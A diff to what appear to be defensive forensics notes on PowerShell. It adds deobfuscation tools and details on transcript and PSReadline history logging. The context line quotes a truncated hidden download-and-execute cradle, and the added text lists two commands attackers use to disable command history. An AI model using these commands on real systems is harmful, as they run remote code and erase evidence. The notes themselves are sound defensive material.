@@ -1717,8 +1717,29 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 	- Invoke-WmiMethod
 	- Invoke-CimMethos
 - Look for encoding and obfuscation
+	- Character frequency analysis [Revoke-Obfuscation](https://github.com/danielbohannon/Revoke-Obfuscation)
+	- [CyberChef](https://github.com/gchq/CyberChef)
+	- [PSDecode](https://github.com/R3MRUM/PSDecode)
+	- [Finding Encoded PS Scripts](https://www.youtube.com/watch?v=JWC7fzhvAY8
+)
 
+<br>
 
+### PowerShell Transcript Logs
+- Records input/output to the powershell terminal
+- Not enabled by default (available in PS v4)
+- Written to ```\Users\<account>\Documents```
+- Can be auto forwarded
+- GPO: Computer Configuration/Administrative Templates/Windows Components/Windows Powershell/Turn on Powershell Transcription
+
+### PSReadline
+- ```ConsoleHost_history.txt```
+- ```%UserProfile%\Roaming\Microsoft\Windows\PowerShell\PSReadline```
+- Records last 4096 commands typed in PS console (not ISE)
+- Enabled by default in Win10/PowerShell v5
+- Attackers can disable (or Remove PsReadLine module)
+	- ```Set-PSReadLineOption -HistorySaveStyle SaveNothing```
+	- ```Remove-Module -Name PsReadline```
 
 <br>
 
